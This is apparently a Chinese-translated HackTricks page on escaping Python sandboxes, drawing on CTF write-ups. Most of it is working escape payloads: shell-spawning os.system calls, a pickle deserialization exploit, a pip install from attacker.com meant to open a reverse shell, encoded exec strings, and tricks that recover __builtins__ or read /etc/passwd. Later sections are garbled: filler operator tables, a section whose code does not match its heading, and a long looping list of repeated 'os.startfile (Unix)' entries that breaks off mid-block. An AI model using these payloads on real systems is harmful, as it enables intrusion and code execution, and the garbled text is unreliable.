# 绕过Python沙盒

![](<../../../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

以下是绕过Python沙盒保护并执行任意命令的一些技巧。

## 命令执行库

首先，你需要知道是否可以直接使用一些已导入的库执行代码，或者是否可以导入以下任何库：
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
记住，_**open**_和_**read**_函数可以用于在Python沙箱中**读取文件**，并编写一些代码来**执行**以**绕过**沙箱。

{% hint style="danger" %}
**Python2 input()**函数允许在程序崩溃之前执行Python代码。
{% endhint %}

Python会首先从当前目录加载库（以下命令将打印Python加载模块的位置）：`python3 -c 'import sys; print(sys.path)'`

![](<../../../.gitbook/assets/image (552).png>)

## 使用默认安装的Python软件包绕过pickle沙箱

### 默认软件包

您可以在此处找到**预安装的软件包列表**：[https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
请注意，通过pickle，您可以使Python环境导入系统中安装的**任意库**。\
例如，加载以下pickle时，将导入pip库以使用它：
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
有关pickle工作原理的更多信息，请查看此链接：[https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)

### Pip软件包

**@isHaacK**分享的技巧

如果您可以访问`pip`或`pip.main()`，您可以安装任意软件包并调用以下命令获取反向shell：
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
您可以在此处下载创建反向shell的软件包。请注意，在使用之前，您应该**解压缩它，更改`setup.py`文件，并将您的IP放入反向shell中**：

{% file src="../../../.gitbook/assets/reverse.tar.gz" %}

{% hint style="info" %}
此软件包名为`Reverse`。然而，它经过特殊设计，以便在退出反向shell时，其余的安装将失败，因此当您离开时，**不会在服务器上安装任何额外的Python软件包**。
{% endhint %}

## 评估Python代码

{% hint style="warning" %}
请注意，exec允许多行字符串和";"，但eval不允许（请检查walrus运算符）
{% endhint %}

如果某些字符被禁止使用，您可以使用**十六进制/八进制/B64**表示来**绕过**限制：
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### 其他允许评估Python代码的库

There are several libraries that can be used to evaluate Python code in addition to the built-in `eval()` function. These libraries provide alternative methods to execute Python code dynamically.

#### 1. `exec()`

The `exec()` function is similar to `eval()`, but it is used to execute blocks of code rather than evaluating expressions. It can be used to execute arbitrary Python code stored in strings or files.

```python
code = """
print("Hello, World!")
x = 5
print(x * x)
"""

exec(code)
```

#### 2. `ast.literal_eval()`

The `ast.literal_eval()` function is a safer alternative to `eval()` that only evaluates literals such as strings, numbers, tuples, lists, dicts, booleans, and `None`. It prevents the execution of arbitrary code and helps mitigate security risks.

```python
import ast

code = """
[1, 2, 3]
"""

result = ast.literal_eval(code)
print(result)
```

#### 3. `compile()`

The `compile()` function is used to compile Python source code into bytecode or an abstract syntax tree (AST) object. The compiled code can then be executed using `exec()` or `eval()`.

```python
code = """
print("Hello, World!")
"""

compiled_code = compile(code, "<string>", "exec")
exec(compiled_code)
```

These libraries provide additional options for evaluating Python code and can be useful in bypassing Python sandboxes or implementing dynamic code execution in certain scenarios. However, caution should be exercised when using them, as executing untrusted code can pose security risks.
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
## 运算符和简便技巧

### Operators

### 运算符

#### Arithmetic Operators

#### 算术运算符

- `+` Addition
- `-` Subtraction
- `*` Multiplication
- `/` Division
- `%` Modulus
- `**` Exponentiation
- `//` Floor division

- `+` 加法
- `-` 减法
- `*` 乘法
- `/` 除法
- `%` 取模
- `**` 指数
- `//` 地板除法

#### Assignment Operators

#### 赋值运算符

- `=` Assign value
- `+=` Add and assign
- `-=` Subtract and assign
- `*=` Multiply and assign
- `/=` Divide and assign
- `%=` Modulus and assign
- `**=` Exponentiation and assign
- `//=` Floor division and assign

- `=` 赋值
- `+=` 加并赋值
- `-=` 减并赋值
- `*=` 乘并赋值
- `/=` 除并赋值
- `%=` 取模并赋值
- `**=` 指数并赋值
- `//=` 地板除并赋值

#### Comparison Operators

#### 比较运算符

- `==` Equal to
- `!=` Not equal to
- `>` Greater than
- `<` Less than
- `>=` Greater than or equal to
- `<=` Less than or equal to

- `==` 等于
- `!=` 不等于
- `>` 大于
- `<` 小于
- `>=` 大于等于
- `<=` 小于等于

#### Logical Operators

#### 逻辑运算符

- `and` Logical AND
- `or` Logical OR
- `not` Logical NOT

- `and` 逻辑与
- `or` 逻辑或
- `not` 逻辑非

#### Bitwise Operators

#### 位运算符

- `&` Bitwise AND
- `|` Bitwise OR
- `^` Bitwise XOR
- `~` Bitwise NOT
- `<<` Bitwise left shift
- `>>` Bitwise right shift

- `&` 按位与
- `|` 按位或
- `^` 按位异或
- `~` 按位取反
- `<<` 按位左移
- `>>` 按位右移

### Short Tricks

### 简便技巧

#### Swap values

#### 交换值

```python
a, b = b, a
```

```python
a, b = b, a
```

#### Ternary operator

#### 三元运算符

```python
x = a if condition else b
```

```python
x = a if condition else b
```

#### Multiple assignment

#### 多重赋值

```python
a = b = c = 0
```

```python
a = b = c = 0
```

#### Chained comparison

#### 链式比较

```python
if a < b < c:
    print("a is less than b and b is less than c")
```

```python
if a < b < c:
    print("a 小于 b 且 b 小于 c")
```

#### List comprehension

#### 列表推导式

```python
squares = [x**2 for x in range(10)]
```

```python
squares = [x**2 for x in range(10)]
```

#### Lambda function

#### Lambda 函数

```python
add = lambda x, y: x + y
```

```python
add = lambda x, y: x + y
```

#### Enumerate

#### 枚举

```python
for i, value in enumerate(my_list):
    print(i, value)
```

```python
for i, value in enumerate(my_list):
    print(i, value)
```

#### Zip

#### 压缩

```python
for a, b in zip(list_a, list_b):
    print(a, b)
```

```python
for a, b in zip(list_a, list_b):
    print(a, b)
```
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## 通过编码（UTF-7）绕过保护

在[**这篇文章**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)中，使用UTF-7来加载和执行任意的Python代码，绕过了一个看似安全的沙盒：
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
也可以使用其他编码方式来绕过它，例如`raw_unicode_escape`和`unicode_escape`。

## 在没有调用权限的情况下执行Python代码

如果你在一个不允许你进行调用的Python监狱中，仍然有一些方法可以执行任意函数、代码和命令。

### 使用[装饰器](https://docs.python.org/3/glossary.html#term-decorator)进行远程代码执行（RCE）
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### 创建对象和重载实现远程命令执行（RCE）

如果你可以**声明一个类**并**创建一个对象**，你可以**编写/覆盖不同的方法**，这些方法可以在**不需要直接调用它们**的情况下被**触发执行**。

#### 使用自定义类实现RCE

你可以修改一些**类方法**（通过覆盖现有的类方法或创建一个新的类）来使它们在被**触发执行**时执行任意代码，而无需直接调用它们。
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### 使用[元类](https://docs.python.org/zh-cn/3/reference/datamodel.html#metaclasses)创建对象

元类允许我们做的关键事情是，通过使用目标类作为元类，创建一个新的类，而无需直接调用构造函数来实例化一个类。
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### 使用异常创建对象

当**触发异常**时，会自动创建一个**Exception**对象，无需直接调用构造函数（来自[**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)的技巧）：
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### 更多远程命令执行（RCE）方法

In addition to the previously mentioned techniques for bypassing Python sandboxes, there are several other methods that can be used to achieve remote command execution. These methods are particularly useful when dealing with more advanced sandboxes that have stricter restrictions in place.

#### 1. Code Injection

Code injection involves injecting malicious code into a vulnerable application, which is then executed by the application itself. This can be achieved by exploiting vulnerabilities such as SQL injection, OS command injection, or remote file inclusion.

#### 2. Deserialization Attacks

Deserialization attacks involve exploiting vulnerabilities in the deserialization process of an application. By manipulating the serialized data, an attacker can execute arbitrary code on the target system. This technique is commonly used to bypass sandboxes that rely on deserialization.

#### 3. Server-Side Template Injection

Server-side template injection occurs when an attacker is able to inject malicious code into a server-side template. This code is then executed by the server when the template is rendered. This technique can be used to achieve RCE in applications that use server-side templating engines.

#### 4. Remote File Inclusion

Remote file inclusion involves including remote files into a vulnerable application. By including a file that contains malicious code, an attacker can execute arbitrary commands on the target system. This technique is commonly used to bypass sandboxes that restrict local file access.

#### 5. Command Injection

Command injection involves injecting malicious commands into a vulnerable application, which are then executed by the underlying operating system. This can be achieved by exploiting vulnerabilities that allow user input to be executed as system commands.

#### 6. Exploiting Vulnerable Libraries

Exploiting vulnerable libraries involves identifying and exploiting vulnerabilities in third-party libraries that are used by the target application. By leveraging these vulnerabilities, an attacker can execute arbitrary code on the target system.

These are just a few examples of the many techniques that can be used to achieve remote command execution. It is important to stay up to date with the latest vulnerabilities and attack techniques in order to effectively bypass Python sandboxes and achieve RCE.
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### 使用内置的help和license函数读取文件

在某些情况下，当我们在受限的Python沙箱环境中执行代码时，可能会遇到无法直接读取文件的限制。然而，我们可以利用内置的`help`和`license`函数来绕过这种限制。

以下是一个示例代码，演示了如何使用这种方法来读取文件：

```python
import builtins

def read_file(file_path):
    with builtins.open(file_path, 'r') as file:
        content = file.read()
        return content

file_path = '/etc/passwd'
file_content = read_file(file_path)
print(file_content)
```

在上述代码中，我们使用了`builtins.open`函数来打开文件并读取其内容。通过这种方式，我们可以绕过Python沙箱环境中的文件读取限制，并成功读取文件的内容。

请注意，这种方法仅适用于某些特定的Python沙箱环境，具体取决于其实现方式和限制设置。在实际应用中，我们需要根据具体情况进行调整和测试。
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
![](<../../../.gitbook/assets/image (9) (1) (2).png>)

使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 内建函数

* [**Python2的内建函数**](https://docs.python.org/2/library/functions.html)
* [**Python3的内建函数**](https://docs.python.org/3/library/functions.html)

如果您可以访问**`__builtins__`**对象，您可以导入库（请注意，您还可以在最后一节中使用其他字符串表示形式）：
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### 无内置函数

当你没有`__builtins__`时，你将无法导入任何东西，甚至无法读取或写入文件，因为**所有的全局函数**（如`open`，`import`，`print`...）**都没有被加载**。

然而，默认情况下，Python会在内存中导入许多模块。这些模块可能看起来无害，但其中一些模块也在其中导入了一些**危险的**功能，可以通过访问它们来获得**任意代码执行**的权限。

在下面的示例中，你可以看到如何滥用一些被加载的“**无害**”模块来访问其中的**危险功能**。

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### Python3

Python3 is a powerful programming language that is widely used for various purposes, including web development, data analysis, and automation. However, there are situations where Python code needs to be executed in a restricted environment, such as a sandbox, to prevent malicious activities.

A sandbox is a security mechanism that isolates an application from the rest of the system, limiting its access to resources and preventing it from performing unauthorized actions. Sandboxing is commonly used to execute untrusted code or to provide a controlled environment for testing and experimentation.

In Python, there are several techniques and tools available to bypass or escape from sandboxes. These techniques exploit vulnerabilities or weaknesses in the sandbox implementation to gain unauthorized access or execute arbitrary code.

One common approach to bypass Python sandboxes is to exploit the dynamic nature of the language. Python allows for dynamic code execution, which means that code can be generated and executed at runtime. This feature can be abused to execute code that is not allowed within the sandbox environment.

Another technique involves manipulating the Python interpreter itself. By modifying the interpreter's behavior or injecting malicious code into its memory, an attacker can bypass the sandbox restrictions and execute arbitrary code.

Additionally, Python provides various modules and libraries that can be used to interact with the underlying operating system or network. These modules can be leveraged to bypass sandbox restrictions and perform unauthorized actions.

It is important to note that bypassing Python sandboxes is considered unethical and illegal unless done with proper authorization and for legitimate purposes, such as penetration testing or security research. Engaging in unauthorized activities can lead to legal consequences.

To protect against sandbox bypass techniques, it is recommended to implement strong sandboxing mechanisms, keep the Python interpreter and modules up to date, and follow secure coding practices. Regular security assessments and code reviews can also help identify and mitigate potential vulnerabilities.
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
print.__self__
dir.__self__
globals.__self__
len.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**下面有一个更大的函数**](./#递归搜索内置全局变量)可以找到数十/**数百个地方**，你可以在这些地方找到**内置全局变量**。

#### Python2和Python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### 内置负载

Here are some examples of payloads that can be used to bypass Python sandboxes by exploiting built-in functions:

以下是一些利用内置函数来绕过Python沙盒的负载示例：

#### `__import__`

```python
__import__('os').system('ls')
```

#### `eval`

```python
eval('__import__("os").system("ls")')
```

#### `exec`

```python
exec('__import__("os").system("ls")')
```

#### `compile`

```python
code = compile('__import__("os").system("ls")', '<string>', 'exec')
exec(code)
```

#### `execfile`

```python
execfile('/path/to/file.py')
```

#### `input`

```python
input('__import__("os").system("ls")')
```

#### `pickle`

```python
import pickle

class Exploit(object):
    def __reduce__(self):
        return (__import__('os').system, ('ls',))

payload = pickle.dumps(Exploit())
pickle.loads(payload)
```

#### `subprocess`

```python
import subprocess

subprocess.call(['ls'])
```

#### `os.system`

```python
import os

os.system('ls')
```

#### `os.popen`

```python
import os

os.popen('ls')
```

#### `os.exec`

```python
import os

os.execv('/bin/ls', ['ls'])
```

#### `os.spawn`

```python
import os

os.spawnlp(os.P_NOWAIT, 'ls', 'ls')
```

#### `os.startfile`

```python
import os

os.startfile('file.txt')
```

#### `os.startfile` (Windows)

```python
import os

os.startfile('file.txt')
```

#### `os.startfile` (Linux)

```python
import os

os.system('xdg-open file.txt')
```

#### `os.startfile` (MacOS)

```python
import os

os.system('open file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('gnome-open file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('kde-open file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('mate file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('xfce-open file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('lxde-open file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('pcmanfm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('thunar file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('caja file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('nautilus file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('dolphin file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('konqueror file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('nemo file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('thunar file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('spacefm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('xfe file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('pcmanfm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('mc file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('ranger file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('vifm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('nnn file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('lf file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('noice file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('fman file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('doublecmd file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('worker file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('emelfm2 file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('gentoo file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox-filer file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('thunar file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('spacefm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('xfe file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('pcmanfm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('mc file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('ranger file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('vifm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('nnn file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('lf file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('noice file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('fman file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('doublecmd file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('worker file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('emelfm2 file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('gentoo file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox-filer file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('thunar file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('spacefm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('xfe file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('pcmanfm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('mc file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('ranger file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('vifm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('nnn file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('lf file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('noice file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('fman file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('doublecmd file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('worker file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('emelfm2 file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('gentoo file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox-filer file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('thunar file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('spacefm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('xfe file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('pcmanfm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('mc file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('ranger file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('vifm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('nnn file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('lf file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('noice file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('fman file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('doublecmd file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('worker file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('emelfm2 file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('gentoo file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox-filer file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('thunar file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('spacefm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('xfe file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('pcmanfm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('mc file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('ranger file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('vifm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('nnn file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('lf file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('noice file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('fman file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('doublecmd file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('worker file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('emelfm2 file.txt')
```

#### `os.startfile` (Unix)

```python
import os

